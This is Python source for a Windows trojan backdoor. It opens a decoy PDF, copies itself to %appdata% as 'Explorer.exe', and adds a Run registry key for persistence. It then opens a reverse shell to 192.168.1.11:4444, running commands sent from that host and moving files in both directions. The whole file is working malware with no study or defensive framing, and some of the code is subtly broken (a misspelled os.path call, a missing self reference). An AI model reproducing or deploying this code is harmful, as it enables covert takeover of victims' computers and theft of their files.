import socket,os,sys
import subprocess,json,base64
import shutil
class Rev_backdoor:
    def __init__(self,ip,port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    def become_persistent(self):
        evil_file_location=os.environ["appdata"]+"\\Explorer.exe"
        if not os.path.exits(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)

    def execute_sys_cmd(self,cmd):
        return subprocess.check_output(cmd,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
    def chwdir(self,path):
        os.chdir(path)
        return "[+] changing working directory."
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)
    def read_file(self,path):
        with open(path,"rb") as input:
            content=input.read()
            input.close()
            return base64.b64encode(content)
    def write_file(self,path,content):
        with open(path,"wb") as output:
            output.write(base64.b64decode(content))
            output.close()
    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)

                return json.loads(json_data)
            except ValueError:
                continue
    def run(self):
        while True:
            cmd=self.reliable_recv() #command from server
            try:
                if cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif cmd[0] == "cd" and len(cmd)> 1:
                    cmd_result=self.chwdir(cmd[1])
                elif cmd[0] == "download":
                    cmd_result  = self.read_file(cmd[1])
                elif cmd[0] == "upload":
                    write_file(cmd[1],cmd[2])
                    self.reliable_send("Upload successful!")
                else:
                    cmd_result= self.execute_sys_cmd(cmd)
            except Exception as msg:
                cmd_result = "[-] Error during command result\n"+msg
            self.reliable_send(cmd_result)
        self.connection.close()
#run front file
filename = sys.__MEIPASS+"\sample.pdf"
subprocess.Popen(filename,shell=True)

#run background file
try:
    myrev_backdoor = Rev_backdoor("192.168.1.11",4444)
    myrev_backdoor.run()
except:
    sys.exit()
